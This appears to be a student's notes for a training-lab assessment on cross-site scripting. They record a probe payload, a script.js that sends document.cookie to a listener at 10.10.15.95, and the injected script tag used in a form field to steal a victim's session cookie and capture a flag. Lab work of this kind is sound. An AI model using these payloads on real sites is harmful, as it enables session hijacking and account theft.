- Start the server below, make sure you are connected to the VPN, and access the `/assessment` directory on the server using the browser
- Apply the skills you learned in this module to achieve the following:

	1. Identify a user-input field that is vulnerable to an XSS vulnerability
	2. Find a working XSS payload that executes JavaScript code on the target's browser
	3. Using the `Session Hijacking` techniques, try to steal the victim's cookies, which should contain the flag

# Finding vulnerable field
----
- `"><script>new Image().src='http://10.10.15.95/field_name'</script>`
- Website field gave the response back:
	- ![[Pasted image 20251031054534.png]]

- `script.js`:
	- `new Image().src='http://10.10.15.95/index.php?c='+document.cookie;`
- `index.php` -> same as previous
- Payload used in `website` form field:
	- `'><script src=http://10.10.15.95/script.js></script>`
- ![[Pasted image 20251031060805.png]]
- ![[Pasted image 20251031060818.png]]